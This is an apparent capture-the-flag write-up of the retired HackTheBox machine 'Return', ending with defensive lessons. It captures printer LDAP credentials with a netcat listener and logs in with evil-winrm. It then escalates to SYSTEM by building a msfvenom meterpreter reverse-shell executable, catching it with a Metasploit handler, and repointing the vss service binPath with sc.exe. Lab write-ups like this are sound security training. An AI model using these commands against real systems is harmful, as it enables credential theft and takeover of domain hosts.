##  Overview

**Machine: Return**

**Difficulty: Easy**

**OS: Windows**

**Points: 0**

**Status: Retired**

---

##  About

This walkthrough covers the full exploitation of the retired HackTheBox machine 'Return'. It is aimed at beginners but also covers privilege escalation steps and explains key tools and credentials used throughout the attack.

---

##  TL;DR

- Scan and enumerate ports (Nmap, enum4linux).

- nteract with the printer web panel to capture credentials via LDAP listener.

- Connect with Evil-winRM using captured creds (svc-printer user).

- Exploit Server Operators group by uploading a Meterpreter shell and modifying service binary path.

- Use Metasploit to catch SYSTEM shell and grab root flag.

## SETUP / NOTES
- Nmap, Enum4linux, Netcat, Evil-winRM, Metasploit.

Based on our `nmap` scan we see that the target is a Windows machine with port 80 IFS `Internet Information Services`, 455 `SMB` and `Windows Remote Management` being available on port 5985.

##  ENUMERATION

Lets enumerate further with `enum4linux`! A great tool that helps us get more information from Windows and Samba systems.

![enum4linux](../../../assets/writeups/return/enum4linux%201.png)

We get some useful information back, like that the domain name is `return` and the host is part of a domain not a workgroup. We will investigate the website before we take another look somewhere else.

![homepage](../../../assets/writeups/return/printerhomepage%202.png)

Nothing much to see here other then a picture of a printer. It's not interactable so let's just hop in the `Settings` section to see if there is something usefull there.

![printer settings](../../../assets/writeups/return/printersettings%203.png)

We are greeted by the printer settings. `Server Address` and `Server Port` makes me think we can connect to it with a listener open `Netcat - nc`. Knowing the username `svc-printer` to the printer is usefull!

These devices store `LDAP` and `SMB` credentials, in order for the printer to query the user list from Active
Directory. Let's set up a listener on port 389 `LDAP` and ofcourse change the `Server Address` to your ip `tun0`.

![nc ldap](../../../assets/writeups/return/nc%204.png)

We have recieved the credentials from the printer!

`1edFg43012!!`

---

##  EXPLOIT

With that being ours now, we can try to connect to the service using `Evil-winRM`. with classifying the `-i` target ip, `-u` username being the svc-printer and ofcourse `-p` password being `1edFg43012!!`

`evil-winrm -i 10.129.102.16 -u svc-printer -p '1edFg43012!!'`

![evilrm connection](../../../assets/writeups/return/evilwinrm%205.png)

We have connection to the service!

Let's go to Desktop if the `userflag` is there.

![userflag](../../../assets/writeups/return/userflag%206.png)

And ofcourse the userflag is located in Desktop.

---

##  PRIVILEGE ESCALATION

Enumerating further with
 - `net user svc-printer`
we see that the group memberships reveals that `svc-printer` is part of `Server Operators`.

![net users](../../../assets/writeups/return/show%20net%20user%207.png)

More information about this is that members of this group can start and stop services. With that in mind we will modify a service binary path to obtain a reverse shell.

The best and `stable` way is to use `msfvenom`. We will use this to generate a `meterpreter reverse shell executable payload` for the remote host.

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell-x86.exe`

Using `tun0` will set your ip automatically.

![msfvenom](../../../assets/writeups/return/msfvenom%208.png)

Great, we have made a shell! With the current `Evil-winRM` shell we have, we can upload the .exec to the remote host.

![shell](../../../assets/writeups/return/shell%209.png)

Next, we will use the Metasploit console to configure a listener for a reverse shell.

`msfconsole`

Select the `multi/handler` module which is used to listen from a compromised system.

`exploit/multi/handler`

![multi/handler](../../../assets/writeups/return/multiculti%2010.png)

Now we will set the payload as `windows/meterpreter/reverse_tcp`, this will allows for a reverse `TCP` connection.

`set PAYLOAD windows/meterpreter/reverse_tcp`

Now set up your HOST and PORT.

```bash
set LHOST tun0
set LPORT 4444
```

After that type `run`.

![run](../../../assets/writeups/return/11.png)

We will go back to our `Evil-winRM` connection. We will use our shell and modify the service binary path to obtain a reverse shell.

`sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell.exe"`

![scexec](../../../assets/writeups/return/sc.exec%2012.png)

Succes!

Having our `Metasploit` listener up, we have a few things left to do. Let's restart vss

`sc.exe stop vss`
`sc.exe start vss`

![connection](../../../assets/writeups/return/meterpreter%2013.png)

Quickly after it's connected to your listener, type `ps` to list the running processes. Choose an appropriate process which is running as `NT AUTHORITY\SYSTEM`

After you have found the `PID` which is all the way on the left, type `migrate <PID>`.

Now that you have a connection, type `shell` to spawn a shell and grab the root flag.

![nt auth](../../../assets/writeups/return/nt%20auth%2014.png)

Doing `cd ..` untill we are at `C:` we can navigate to `\Users\Administrator\Desktop` and find the root flag there.

![root](../../../assets/writeups/return/root.png)


Pwned!

## LESSONS LEARNED

- Always check memberships of service accounts.

- Network devices can be leveraged to gain domain credentials.

- Proper segmentation and least privilege are critical in domain environments.
